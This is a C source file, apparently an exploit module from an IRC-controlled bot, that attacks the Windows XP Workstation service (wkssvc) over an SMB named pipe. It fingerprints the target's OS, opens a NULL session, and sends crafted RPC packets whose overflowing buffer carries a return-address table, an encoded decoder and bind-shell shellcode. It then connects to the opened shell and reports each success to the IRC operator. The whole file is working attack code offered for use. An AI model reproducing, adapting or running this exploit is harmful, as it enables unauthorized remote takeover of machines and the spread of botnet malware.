#include "includes.h"
#include "functions.h"

#ifndef NO_WKSSVC

unsigned char szStack[]	= "\x66\x81\xec\xd0\x07"; // sub sp, 7d0h

unsigned char szWKSSVCUnknown1[] = "\x74\x9f\x12\x00";
unsigned char szWKSSVCUnknown2[] = "\x78\x7d\x12\x00";

unsigned char szDecoder[] = 
"\x60\xeb\x03\x5b\x53\xc3\xe8\xf8\xff\xff\xff\x31\xc0\x04\x34\x01"
"\xd8\x50\x5b\x31\xd2\x02\x10\x40\x02\x30\x40\x50\x31\xc0\x04\x41"
"\x28\xc2\x28\xc6\xc0\xe2\x04\x66\xc1\xea\x04\x31\xc0\x30\xf6\x02"
"\x03\x28\x03\x66\x01\x13\x43\x58\x31\xc9\x02\x08\xe0\xd5\x61";
void Encode( const unsigned char* pszIn, unsigned int nLen, unsigned char* pszOut )
{
	for( unsigned int n = 0; n < nLen; n++ )
	{
		char cHiPart = ( pszIn[ n ] >> 4 ) & 0xf;
		char cLoPart = pszIn[ n ] & 0xf;

		pszOut[ ( n * 2 ) ]		= cLoPart + 'A';
		pszOut[ ( n * 2 ) + 1 ]	= cHiPart + 'A';
	}
}

typedef struct
{
	unsigned long nNewEIP;						// memory offset of the new EIP (0 character bytes are not possible and the forbidden characters of your and the target codepage)
	unsigned long nNewEIP_BufferOffset;			// offset in the exploits buffer for nNewEIP
	bool bCanUse_NetAddAlternateComputerName;	// can use the NetAddAlternateComputerName function YES/NO
} Target;
Target Targets[] =
{
	{ 0x77bd3143, 2044, true  }, // version.dll, call edi
	{ 0x77c03143, 2044, true  }, // version.dll, call edi
	{ 0x77BD1F89, 2044, true  },
	{ 0x655b4f02, 2023, false },
	{ 0x77C01F89, 2044, true  },
        { 0x77B920FD, 2044, true  },
        { 0x77E14C29, 2044, true  },
        { 0x77E2AFC5, 2044, true  },
        { 0x77E2492B, 2044, true  },
        { 0x77E4FF15, 2044, true  },
        { 0x77E33F4D, 2044, true  },
};     

#pragma pack(1)
typedef unsigned char UINT8;
typedef unsigned short UINT16;
typedef unsigned int UINT32; 
typedef struct
{
	UINT32 maxlength;
	UINT32 unknown;
	UINT32 length;
} UNISTR2;
typedef struct
{
	UINT8 versionmaj;
	UINT8 versionmin;
	UINT8 type;
	UINT8 flags;
	UINT32 representation;
	UINT16 fraglength;
	UINT16 authlength;
	UINT32 callid;
} RPC_Header;
typedef struct
{
	UINT8 byte[16];
	UINT32 version;
} RPC_Iface;
typedef struct
{
	RPC_Header NormalHeader;
	UINT16 maxtsize;
	UINT16 maxrsize;
	UINT32 assocgid;
	UINT32 numelements;
	UINT16 contextid;
	UINT8 numsyntaxes;
	UINT8 align; // 4 byte align
	RPC_Iface Interface1;
	RPC_Iface Interface2;
} RPC_ReqBind;
typedef struct
{
	RPC_Header NormalHeader;
	UINT32 allochint;
	UINT16 prescontext;
	UINT16 opnum;
} RPC_ReqNorm;
#pragma pack()

BOOL SendReqPacket_Part(HANDLE hPipe, RPC_ReqNorm pPacketHeader, unsigned char *pStubData, unsigned long nDataLen, unsigned long nMaxSize, bool bFirst)
{
	bool bSendNext;
	unsigned char *pPacket;
	unsigned long nBytesWritten;

	// first fragment
	if( bFirst )
		pPacketHeader.NormalHeader.flags |= 1; // first fragment
	else
		pPacketHeader.NormalHeader.flags &= ~1; // not first fragment

	if( ( nDataLen + sizeof( RPC_ReqNorm ) ) <= nMaxSize )
	{
		// last
		pPacketHeader.NormalHeader.fraglength	= (unsigned short)( nDataLen + sizeof( RPC_ReqNorm ) );
		pPacketHeader.allochint					= nDataLen;
		pPacketHeader.NormalHeader.flags		|= 2; // last fragment

		bSendNext = false;
	}
	else
	{
		// not last fragment
		pPacketHeader.NormalHeader.fraglength	= (unsigned short)nMaxSize;
		pPacketHeader.allochint					= nMaxSize - sizeof( RPC_ReqNorm );
		pPacketHeader.NormalHeader.flags		&= ~2; // not last fragment

		bSendNext = true;
	}

	// alloc packet
	pPacket = (unsigned char*)malloc( pPacketHeader.NormalHeader.fraglength );
	if( !pPacket )
		return false;

	// make packet
	*(RPC_ReqNorm*)pPacket = pPacketHeader; // copy header
	memcpy( &pPacket[ sizeof( RPC_ReqNorm ) ], pStubData, pPacketHeader.allochint ); // add stub data

	// send
	if( !WriteFile( hPipe, pPacket, pPacketHeader.NormalHeader.fraglength, &nBytesWritten, NULL ) )
	{
		free( pPacket );
		return false;
	}
	free( pPacket );

	// send remaining
	if( bSendNext )
		return SendReqPacket_Part( hPipe, pPacketHeader, &pStubData[ pPacketHeader.allochint ], nDataLen - pPacketHeader.allochint, nMaxSize, false );
	else
		return true;
}

int wbindsize=405;

//BOOL ScriptGod_WKSSVC(unsigned long nTargetID,EXINFO exinfo,char *target, void* conn)
BOOL sgwkssvc(unsigned long nTargetID,EXINFO exinfo,char *target, void* conn)
{
	IRC* irc=(IRC*)conn;
	//irc->privmsg(target,"%s %s: Connected to IP: %s.", scan_title, exploit[exinfo.exploit].name, exinfo.ip);
	
	BOOL success=FALSE;
	int TargetOS;
//	char szShellBuf[ 512 ];
	int iShellSize;

	// =============================
	char* pszTarget;
	// ---
	char szNetbiosTarget[ 8192 ];
	wchar_t wszNetbiosTarget[ 8192 ];
	unsigned char szShellcodeEncoded[ ( 405 * 2 ) + 1 ];
	unsigned char szExploitsData[ 3500 ];
	unsigned long nExploitsDataPos;
	wchar_t wszExploitsData[ sizeof( szExploitsData ) ];
	// ---
	char szIPC[ 8192 ];
	NETRESOURCE NetSource;
	// ---
	char szPipe[ 8192 ];
	HANDLE hPipe;
	// ---
	RPC_ReqBind BindPacket;
	unsigned long nBytesWritten;
	RPC_ReqNorm ReqNormalHeader;
	unsigned long nPacketSize;
	unsigned char* pPacket;
	unsigned long nPacketPos;
	// ============================

	TargetOS = FpHost(exinfo.ip, FP_PORT5K);
	if(TargetOS != OS_WINXP)
		TargetOS = FpHost(exinfo.ip, FP_RPC);

	if(TargetOS != OS_WINXP)
		return FALSE;
	else
		success=TRUE;
	
//	irc->privmsg(target,"%s %s: Target running XP: %s.", scan_title, exploit[exinfo.exploit].name, exinfo.ip);

	// parameters
	pszTarget=exinfo.ip;

//	char URL[MAX_HOSTNAME];
//	char fname[_MAX_FNAME];
//	sprintf(fname,"eraseme_%d%d%d%d%d.exe",rand()%9,rand()%9,rand()%9,rand()%9,rand()%9);
//	_snprintf(URL,sizeof(URL),
//		"ftp://1:1@%s:%d/%s",
//		(PrivateIP(exinfo.ip)?inip:exip),FTP_PORT,fname);
	
	unsigned short port;
    port = fhtons(bindport)^(USHORT)0x9999;
    memcpy(&bindshell[176],&port,2);
    
	iShellSize=wbindsize;//setup_shellcode_udtf(szShellBuf, sizeof(szShellBuf), URL, false, NULL);
	if (!iShellSize)
		return FALSE;

	// get shellcode
	//iShellSize = GetRNS0TerminatedShellcode( szShellBuf, sizeof( szShellBuf ), GetIP( exinfo.sock ), filename );
	//if( !iShellSize )
	//	return FALSE;

	// generate exploits buffer
	// ========================
	ZeroMemory(szShellcodeEncoded, sizeof(szShellcodeEncoded));
	ZeroMemory(szExploitsData, sizeof(szExploitsData));
	ZeroMemory(wszExploitsData, sizeof(wszExploitsData));

	// fill with NOPs (using inc ecx instead of NOP, 0-terminated-string)
	memset(szExploitsData,'A',sizeof(szExploitsData)-1);

	// new EIP
	*(unsigned long*)(&szExploitsData[Targets[nTargetID].nNewEIP_BufferOffset]) = Targets[nTargetID].nNewEIP;

	// some NOPs
	nExploitsDataPos = 2300;

	// add stack
	memcpy( &szExploitsData[ nExploitsDataPos ], szStack, sizeof( szStack ) - 1 );
	nExploitsDataPos += sizeof( szStack ) - 1;

	// add decoder
	memcpy( &szExploitsData[ nExploitsDataPos ], szDecoder, sizeof( szDecoder ) - 1 );
	nExploitsDataPos += sizeof( szDecoder ) - 1;

	// add shellcode
	// - bind port
	// - encode
	Encode( (unsigned char*)bindshell, iShellSize, szShellcodeEncoded );
	// - add
	memcpy( &szExploitsData[ nExploitsDataPos ], szShellcodeEncoded, strlen( (char*)szShellcodeEncoded ) );
	nExploitsDataPos += strlen( (char*)szShellcodeEncoded );
	// - 0 terminaten for decoder
	szExploitsData[ nExploitsDataPos ] = 0;
	nExploitsDataPos += 1;

	// convert to UNICODE
	// ==================
	for( int n = 0; n < sizeof( szExploitsData ); n++ )
		wszExploitsData[ n ] = szExploitsData[ n ];
	//MultiByteToWideChar( CP_ACP, 0, (char*)szExploitsData, -1, wszExploitsData, sizeof( wszExploitsData ) / sizeof( wchar_t ) );
	_snprintf(szNetbiosTarget,sizeof(szNetbiosTarget), "\\\\%s", pszTarget);
	mbstowcs(wszNetbiosTarget,szNetbiosTarget, sizeof(wszNetbiosTarget)/sizeof(wchar_t));
	
	// create NULL session
	// ===================
	if( strcmpi( pszTarget, "." ) )
	{
		//_snprintf(szIPC,sizeof(szIPC), "\\\\%s\\", pszTarget);
		_snprintf(szIPC,sizeof(szIPC),"\\\\%s\\",pszTarget);
		strncat(szIPC,"ipc$",sizeof(szIPC));
		ZeroMemory(&NetSource,sizeof(NetSource));
		NetSource.lpRemoteName = szIPC;
		fWNetAddConnection2(&NetSource,"","",0);
	}
	// ===================

	// connect to pipe
	// ===============
	//_snprintf(szPipe,sizeof(szPipe),"\\\\%s\\pipe\\wkssvc",pszTarget);
	_snprintf(szPipe,sizeof(szPipe),"\\\\%s\\",pszTarget);
	strncat(szPipe,"pipe\\wkssvc",sizeof(szPipe));
	hPipe = CreateFile(szPipe, GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);
	if(hPipe == INVALID_HANDLE_VALUE)
	{
		fWNetCancelConnection2(NetSource.lpRemoteName, 0, FALSE);
		return FALSE;
	}
	// ===============

	// bind packet
	// ===========
	ZeroMemory(&BindPacket,sizeof(BindPacket));
	BindPacket.NormalHeader.versionmaj		= 5;
	BindPacket.NormalHeader.versionmin		= 0;
	BindPacket.NormalHeader.type			= 11;	// bind
	BindPacket.NormalHeader.flags			= 3;	// first + last fragment
	BindPacket.NormalHeader.representation	= 0x00000010; // little endian
	BindPacket.NormalHeader.fraglength		= sizeof(BindPacket);
	BindPacket.NormalHeader.authlength		= 0;
	BindPacket.NormalHeader.callid			= 1;
	BindPacket.maxtsize						= 4280;
	BindPacket.maxrsize						= 4280;
	BindPacket.assocgid						= 0;
	BindPacket.numelements					= 1;
	BindPacket.contextid					= 0;
	BindPacket.numsyntaxes					= 1;
	BindPacket.Interface1.version			= 1;
	memcpy(BindPacket.Interface1.byte, "\x98\xd0\xff\x6b\x12\xa1\x10\x36\x98\x33\x46\xc3\xf8\x7e\x34\x5a", 16);
	BindPacket.Interface2.version			= 2;
	memcpy(BindPacket.Interface2.byte, "\x04\x5d\x88\x8a\xeb\x1c\xc9\x11\x9f\xe8\x08\x00\x2b\x10\x48\x60", 16);

	// send
	if(!WriteFile(hPipe, &BindPacket, sizeof( RPC_ReqBind ), &nBytesWritten, NULL))
	{
		//irc->privmsg(target,"%s %s: !WriteFile: %s.", scan_title, exploit[exinfo.exploit].name, exinfo.ip);
		CloseHandle(hPipe);
		fWNetCancelConnection2(NetSource.lpRemoteName, 0, FALSE);
		return FALSE;
	}
	// ===========

	// request
	// =======
	// generate packet
	// ---------------

	// calc packet size
	nPacketSize = 0;
	nPacketSize += sizeof( szWKSSVCUnknown1 ) - 1;
	nPacketSize += sizeof( UNISTR2 );
	nPacketSize += ( wcslen( wszNetbiosTarget ) + 1 ) * sizeof( wchar_t );
	while(nPacketSize % 4)
		nPacketSize++;
	if(Targets[nTargetID].bCanUse_NetAddAlternateComputerName)
		nPacketSize += sizeof( szWKSSVCUnknown2 ) - 1;
	nPacketSize += sizeof( UNISTR2 ); 
	nPacketSize += ( wcslen( wszExploitsData ) + 1 ) * sizeof( wchar_t );
	while( nPacketSize % 4 )
		nPacketSize++;
	nPacketSize += 8; // szWSSKVCUnknown3
	if( Targets[ nTargetID ].bCanUse_NetAddAlternateComputerName )
		nPacketSize += 4; // NetAddAlternateComputerName = reserved
	else
		nPacketSize += 2; // NetValidateName = NameType

	// alloc packet
	pPacket = (unsigned char*)malloc( nPacketSize );
	if( !pPacket )
	{
		//irc->privmsg(target,"%s %s: !malloc: %s.", scan_title, exploit[exinfo.exploit].name, exinfo.ip);
		CloseHandle( hPipe );
		fWNetCancelConnection2( NetSource.lpRemoteName, 0, FALSE );
		return FALSE;
	}
	ZeroMemory(pPacket,nPacketSize);

	// build packet
	nPacketPos = 0;

	// - szWKSSVCUnknown1
	memcpy( &pPacket[ nPacketPos ], szWKSSVCUnknown1, sizeof( szWKSSVCUnknown1 ) - 1 );
	nPacketPos += sizeof( szWKSSVCUnknown1 ) - 1;

	// - wszNetbiosTarget
	( (UNISTR2*)&pPacket[ nPacketPos ] )->length	= wcslen( wszNetbiosTarget ) + 1;
	( (UNISTR2*)&pPacket[ nPacketPos ] )->unknown	= 0;
	( (UNISTR2*)&pPacket[ nPacketPos ] )->maxlength	= ( (UNISTR2*)&pPacket[ nPacketPos ] )->length;
	nPacketPos += sizeof( UNISTR2 );

	wcscpy( (wchar_t*)&pPacket[ nPacketPos ], wszNetbiosTarget );
	nPacketPos += ( wcslen( wszNetbiosTarget ) + 1 ) * sizeof( wchar_t );

	// - align
	while( nPacketPos % 4 )
		nPacketPos++;

	// - szWKSSVCUnknown2
	if( Targets[ nTargetID ].bCanUse_NetAddAlternateComputerName )
	{
		memcpy( &pPacket[ nPacketPos ], szWKSSVCUnknown2, sizeof( szWKSSVCUnknown2 ) - 1 );
		nPacketPos += sizeof( szWKSSVCUnknown2 ) - 1;
	}

	// - wszExploitsData
	( (UNISTR2*)&pPacket[ nPacketPos ] )->length	= wcslen( wszExploitsData ) + 1;
	( (UNISTR2*)&pPacket[ nPacketPos ] )->unknown	= 0;
	( (UNISTR2*)&pPacket[ nPacketPos ] )->maxlength	= ( (UNISTR2*)&pPacket[ nPacketPos ] )->length;
	nPacketPos += sizeof( UNISTR2 );

	wcscpy( (wchar_t*)&pPacket[ nPacketPos ], wszExploitsData );
	nPacketPos += ( wcslen( wszExploitsData ) + 1 ) * sizeof( wchar_t );

	// - align
	while( nPacketPos % 4 )
		nPacketPos++;

	// - szWSSKVCUnknown3 (only eigth 0x00s)
	ZeroMemory(&pPacket[nPacketPos],8);
	nPacketPos += 8;

	if( Targets[ nTargetID ].bCanUse_NetAddAlternateComputerName )
	{
		// NetAddAlternateComputerName = 0
		*(DWORD*)&pPacket[ nPacketPos ] = 0;
		nPacketPos += sizeof( DWORD );
	}
	else
	{
		// NetValidateName = NetSetupMachine
		*(unsigned short*)&pPacket[ nPacketPos ] = 1;
		nPacketPos += 2;
	}

	// header
	ZeroMemory(&ReqNormalHeader,sizeof(ReqNormalHeader));
	ReqNormalHeader.NormalHeader.versionmaj		= 5;
	ReqNormalHeader.NormalHeader.versionmin		= 0;
	ReqNormalHeader.NormalHeader.type			= 0;	// request
	ReqNormalHeader.NormalHeader.flags			= 3;	// first + last fragment
	ReqNormalHeader.NormalHeader.representation	= 0x00000010; // little endian
	ReqNormalHeader.NormalHeader.authlength		= 0;
	ReqNormalHeader.NormalHeader.callid			= 1;
	ReqNormalHeader.prescontext					= 0;
	if( Targets[ nTargetID ].bCanUse_NetAddAlternateComputerName )
		ReqNormalHeader.opnum					= 27;	// NetrAddAlternateComputerName
	else
		ReqNormalHeader.opnum					= 25;	// NetrValidateName2
	// send
	if( !SendReqPacket_Part( hPipe, ReqNormalHeader, pPacket, nPacketSize, 4280, true ) )
	{
		//irc->privmsg(target,"%s %s: !SendReqPacket_Part: %s.", scan_title, exploit[exinfo.exploit].name, exinfo.ip);
		CloseHandle( hPipe );
		free( pPacket );
		fWNetCancelConnection2( NetSource.lpRemoteName, 0, FALSE );
		return FALSE;
	}
	// =======
	
	// clean up
	// =================;
	CloseHandle( hPipe );
	free( pPacket );
	fWNetCancelConnection2( NetSource.lpRemoteName, 0, FALSE );

	if (success)
	{
		Sleep(5000);
		if (ConnectShell(exinfo,bindport))
		{
			if (!exinfo.silent)
				irc->privmsg(target,"%s %s: Exploiting IP: %s.", scan_title, exploit[exinfo.exploit].name, exinfo.ip);
			exploit[exinfo.exploit].stats++;
		}
		else
			if (!exinfo.silent && exinfo.verbose)
				irc->privmsg(target,"%s %s: Failed to exploit IP: %s.", scan_title, exploit[exinfo.exploit].name, exinfo.ip);
	}
	return TRUE;
}


//BOOL ScriptGod_WKSSVC_Eng(char *target, void* conn,EXINFO exinfo)
BOOL wkssvce(char *target, void* conn,EXINFO exinfo)
{
	BOOL bOK;

	// 2 times
	bOK = sgwkssvc(1, exinfo,target,conn);
	if( !sgwkssvc(1, exinfo,target,conn) && !bOK )
		return FALSE;
	else
		return TRUE;
}

//BOOL ScriptGod_WKSSVC_Other(char *target, void* conn,EXINFO exinfo)
BOOL wkssvco(char *target, void* conn,EXINFO exinfo)
{
	BOOL bOK;

	// 2 times
	bOK = sgwkssvc( 0, exinfo,target,conn );
	if( !sgwkssvc( 0, exinfo,target,conn ) && !bOK )
	bOK = sgwkssvc(1, exinfo,target,conn);
	if( !sgwkssvc(1, exinfo,target,conn) && !bOK )
	bOK = sgwkssvc( 2, exinfo,target,conn );
	if( !sgwkssvc( 2, exinfo,target,conn ) && !bOK )
	bOK = sgwkssvc( 3, exinfo,target,conn );
	if( !sgwkssvc( 3, exinfo,target,conn ) && !bOK )
	bOK = sgwkssvc( 4, exinfo,target,conn );
	if( !sgwkssvc( 4, exinfo,target,conn ) && !bOK )
	bOK = sgwkssvc( 5, exinfo,target,conn );
	if( !sgwkssvc( 5, exinfo,target,conn ) && !bOK )
	bOK = sgwkssvc( 6, exinfo,target,conn );
	if( !sgwkssvc( 6, exinfo,target,conn ) && !bOK )
	bOK = sgwkssvc( 7, exinfo,target,conn );
	if( !sgwkssvc( 7, exinfo,target,conn ) && !bOK )
	bOK = sgwkssvc( 8, exinfo,target,conn );
	if( !sgwkssvc( 8, exinfo,target,conn ) && !bOK )
	bOK = sgwkssvc( 9, exinfo,target,conn );
	if( !sgwkssvc( 9, exinfo,target,conn ) && !bOK )
	bOK = sgwkssvc( 10, exinfo,target,conn );
	if( !sgwkssvc( 10, exinfo,target,conn ) && !bOK )
	 return FALSE;                      
            else
            		return TRUE;
}

#endif